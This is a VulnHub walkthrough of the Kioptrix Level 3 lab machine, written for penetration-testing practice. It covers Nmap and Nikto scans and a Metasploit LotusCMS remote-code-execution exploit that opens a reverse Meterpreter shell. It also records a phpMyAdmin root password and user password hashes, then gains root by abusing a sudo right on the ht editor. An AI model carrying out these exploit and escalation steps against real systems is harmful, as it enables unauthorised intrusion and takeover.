
Kioptrix:3

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Exploiting LotusCMS - Metasploit
[+] export TERM
[+] Password HASH cracking
[+] Privilege Escalation abusing SUDO right /urs/local/bin/ht
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Results from Nmap Scanning

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.111
Host is up (0.00032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:5D:A4:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.56.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.88 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Results from Nikto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.111
+ Target Hostname:    192.168.56.111
+ Target Port:        80
+ Start Time:         2019-10-03 03:06:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7534 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-10-03 03:06:12 (GMT-4) (10 seconds)
---------------------------------------------------------------------------

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing we can find a LotusCMS 
Looking for available exploits

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/kioptrix3# searchsploit lotuscms
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                                                                                       | exploits/php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                                                                                                           | exploits/php/webapps/16982.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Exploitation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > use exploit/multi/http/lcms_php_exec
msf5 exploit(multi/http/lcms_php_exec) > set rhosts 192.168.56.111
rhosts => 192.168.56.111
msf5 exploit(multi/http/lcms_php_exec) > set uri /
uri => /
msf5 exploit(multi/http/lcms_php_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Sending stage (38247 bytes) to 192.168.56.111
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.111:51386) at 2019-10-03 03:09:15 -0400

meterpreter > shell
Process 4340 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We found the credentials for the phpmyadmin discovered by nikto 
root : fuckeyou
After loggin into phpmyadmin we found the following accounts and passowrd hashes

dreg : 0d3eccfb887aabd50f243b3f155c0f85
loneferret : 5badcaf789d3d1d09794d8f021f40f0e
![Alt Tag]()
Connecting with ssh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh loneferret@192.168.56.111
loneferret@192.168.56.111's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Thu Oct  3 03:46:37 2019 from 192.168.56.102
loneferret@Kioptrix3:~$ id
uid=1000(loneferret) gid=100(users) groups=100(users)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ht
Error opening terminal: xterm-256color.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Changing the terminal
export TERM=xterm

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation
sudo /usr/local/bin/ht
Change the permissions on user loneferret to the same as roots

![Alt Tag]()

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
loneferret@Kioptrix3:~$ sudo /usr/local/bin/ht
loneferret@Kioptrix3:~$ sudo su
[sudo] password for loneferret: 
root@Kioptrix3:/home/loneferret# id
uid=0(root) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

